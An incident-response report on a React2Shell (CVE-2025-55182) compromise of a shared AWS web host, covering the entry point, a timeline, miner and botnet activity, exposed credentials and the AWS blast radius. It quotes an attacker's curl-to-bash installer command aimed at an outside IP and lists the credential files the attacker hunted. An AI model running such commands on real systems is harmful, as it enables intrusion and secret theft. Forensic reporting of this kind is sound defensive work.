# Investigation report — React2Shell compromise of `i-0b7f49ca3e9852d4b`

Investigated 2026-09-16 with read-only diagnostics over AWS SSM, CloudTrail event history and
CloudWatch metrics. Every conclusion below cites the evidence that supports it. No secret values
are reproduced. Raw artefacts: EBS snapshot `snap-0d28d630743a401d3` and
`s3://metnmat-forensics-976134557584/`.

## What was hosted, and what was affected

Two instances exist in account 976134557584 / ap-south-1:

- **`i-0b7f49ca3e9852d4b`** (EIP 15.206.25.71, tag `metnmat-website`, t3.medium) — the shared
  host. Ran, as PM2 processes under the single user `ec2-user` behind one Caddy: the website
  (`:3100`), the Payload CMS (`:3200`), the chatbot (`:3002`) and the **MTrace Command Center
  dashboard** (`:3000`). **Fully compromised.**
- **`i-001a2ec37cab94a96`** (13.232.132.186, `metnmat-whatsapp-worker`, t3.small) — **clean**:
  load average 0.26, no implants in `/tmp`, `/dev/shm`, `~`, no malicious cron or systemd unit,
  separate security group and IAM role. Not affected.

MTrace's own infrastructure is separate and is **not** implicated; only the Command Center
dashboard runs on the compromised host.

## Entry point

Website and CMS both ran **Next.js 15.1.6 + React 19.0.0**, vulnerable to the React2Shell
unauthenticated RCE (CVE-2025-55182, fixed ≥ 15.1.9). The exploit returns command output inside
the `NEXT_REDIRECT` "digest" error, which Next writes to its log.

- `website.error.log` contains **1,766** `digest:` lines whose base64 decodes to the process
  environment — e.g. `2026-08-13T20:31:23` → `{"metnmat-website":"{}","SHELL":"/bin/bash","RESEND_API_KEY":…}`.
- The downloaded tool `nextjs_crack.py` on the host documents the exact technique in its header
  ("React2Shell (CVE-2025-55182) … output re-encoded base64 → x-action-redirect / NEXT_REDIRECT digest").

## Timeline (evidence in brackets)

| UTC | Event | Evidence |
|---|---|---|
| 2026-08-13 20:31 | First RCE, environment dumped via digest | `website.error.log:772` |
| 2026-08-19→20 | CPU pegs to 100% and stays | CloudWatch daily avg: Aug 19 = 84%, Aug 20–Sep 1 = 100% |
| 2026-08-22 13:53 | First malicious crontab installed (`pakchoi` + `docker amco_*`) | journal `crontab[…] (ec2-user) REPLACE` |
| 2026-08-25 12:45 | Installer run through the CMS | `cms.error.log`: `Command failed: curl -sSL http://45.86.86.23:11133/wjazvtmfsd/install | bash` |
| 2026-08-28 10:45 | Command Center `.env` read | digest decodes to `=== SRCFILE:/home/ec2-user/app/repo/.env === GMAIL_CLIENT_S…` |
| 2026-08-30→09-09 | Credential hunting (`.env`, `.aws`, `.npmrc`, `.git-credentials`, recursive `find`) | 76 `Command failed` lines in `cms.error.log` |
| 2026-08-31→09-12 | xmrig Monero miner (`system-check`/`systemx86`) | `strings` → `xmrig`/`Monero`; kernel `Out of memory: Killed process (systemx86)` |
| 2026-09-14 14:29 → now | "tiktouk" botnet fully deployed; egress explodes | NetworkOut 20/39/7.5 GB on Sep 14/15/16 (baseline < 1 GB) |

## What the attacker did

- **Root capability**: RCE ran as `ec2-user`, which has `NOPASSWD:ALL` (`/etc/sudoers.d/90-cloud-init-users`). The `pakchoi` backdoor user in cron **never succeeded** (`id pakchoi` → none; sshd logs "Invalid user pakchoi from 127.0.0.1").
- **Persistence**: `ec2-user` crontab relaunches `/tmp/.core-sync` and `/tmp/.tiktouk/dog.sh` every minute.
- **Botnet workload** (process list + `/tmp/.tiktouk/`): Monero mining; scanning and cracking of **other** sites (WordPress `wp2s`, Metabase, SMTP `gsmtp`, `pathscan`, `jscrawl`); self-propagation of the same Next.js bug (`nextjs_scan/crack/enroll.py`); and an HTTP/2 DDoS of `quickex.io` (`/dev/shm/.n.js`). C2 is `193.32.162.134`.
- **Why the site was down**: resource starvation (load average 410, repeated OOM kills), not a code fault. Caddy returned 502 because `:3100` could not respond.

## Credential exposure (detail in `02-credential-inventory.md`)

Treat as exposed: everything readable by `ec2-user` or present in any process env on the box.
Directly confirmed:
- All `metnmat/prod/*` — present in `/proc/<.n.js>/environ` (attacker child of the CMS process).
- All `metnmat/chatbot/*` — **read by the attacker through the instance role** on 2026-09-15 07:32 UTC (CloudTrail `GetSecretValue`, outside any deploy), because the metadata service answered `ec2-user` (verified: `curl … 169.254.169.254` returns 200 as `ec2-user`).
- The Command Center `.env` (93 keys: Supabase service-role, Zoho, Gmail refresh tokens, Amazon SP-API, WhatsApp, DeepSeek/Gemini/Groq, DATABASE_URL) — `cat`-ed via the RCE on 2026-08-28.
- GitHub deploy key `id_ed25519` for `Metnmat_Dashboard` (readable by `ec2-user`).

## AWS blast radius — checked, and limited

CloudTrail (19,065 instance-role events since Aug 20) shows the role used only for the apps' own
`GetSecretValue`/`Decrypt`, the chatbot-secret reads above, and **AccessDenied** probes
(`ListBuckets`, `ListFunctions`, `GetParametersByPath`). **No** `InvokeModel` (Bedrock), **no**
`CreateUser`/`CreateAccessKey`/`AttachUserPolicy`, **no** `ConsoleLogin`. The Aug 27
`RunInstances`/`AuthorizeSecurityGroupIngress` were the account **owner** (root, browser, IP
103.50.83.34), not the attacker. S3 media bucket: no attacker writes/deletes (newest object
2026-09-04; no attacker delete markers). Object-level *reads* cannot be confirmed — CloudTrail had
no S3 data events (fixed by `deploy/v2/aws/monitoring.sh`).

## Verdict

The whole `i-0b7f49ca3e9852d4b` instance is compromised and must be rebuilt, not cleaned. The
worker instance and the wider AWS account were not pivoted into. Recovery is `05-recovery-runbook.md`;
the design that prevents a recurrence is `04-secret-architecture.md`.
